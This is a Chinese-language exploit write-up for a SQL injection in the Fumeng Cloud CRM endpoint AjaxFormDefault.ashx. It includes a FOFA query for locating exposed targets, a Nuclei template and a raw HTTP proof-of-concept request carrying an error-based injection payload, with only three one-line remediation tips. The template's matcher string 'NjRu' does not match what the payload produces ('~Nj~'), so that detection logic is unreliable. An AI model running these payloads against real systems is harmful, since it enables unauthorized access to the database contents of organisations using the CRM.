# 孚盟云CRM AjaxFormDefault.ashx SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 孚盟云CRM AjaxFormDefault.ashx接口SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | AjaxFormDefault.ashx |
| 影响版本 | 孚盟云CRM |

## 漏洞概述

孚盟云CRM系统AjaxFormDefault.ashx接口存在SQL注入漏洞，攻击者可通过构造恶意参数获取数据库敏感信息。

## fofa查询语句

```
app="孚盟软件-孚盟云"
```

## 漏洞复现

### Nuclei模板

```yaml
id: fuyun-crm-ajaxformdefault-sql-injection

info:
  name: 孚盟云CRM AjaxFormDefault.ashx SQL注入
  author: unknown
  severity: critical
  description: 孚盟云CRM AjaxFormDefault.ashx接口存在SQL注入漏洞
  tags: sql-injection,fuyun,crm

requests:
  - method: POST
    path:
      - "{{BaseURL}}/m/Dingding/Ajax/AjaxFormDefault.ashx"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=sendProductMessage&DetailID=' and 1=CONVERT(int,char(126)%2bchar(78)%2bchar(106)%2bchar(126))--
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "NjRu"
        part: body
      - type: status
        status:
          - 200
```

### cURL POC

```http
POST /m/Dingding/Ajax/AjaxFormDefault.ashx HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Length: 102
Content-Type: application/x-www-form-urlencoded

action=sendProductMessage&DetailID=' and 1=CONVERT(int,char(126)%2bchar(78)%2bchar(106)%2bchar(126))--
```

### 漏洞特征

- 路径：`/m/Dingding/Ajax/AjaxFormDefault.ashx`
- 参数：`action=sendProductMessage`, `DetailID`
- HTTP方法：POST

## 修复建议

1. 打补丁
2. 使用参数化查询
3. 实施严格输入验证
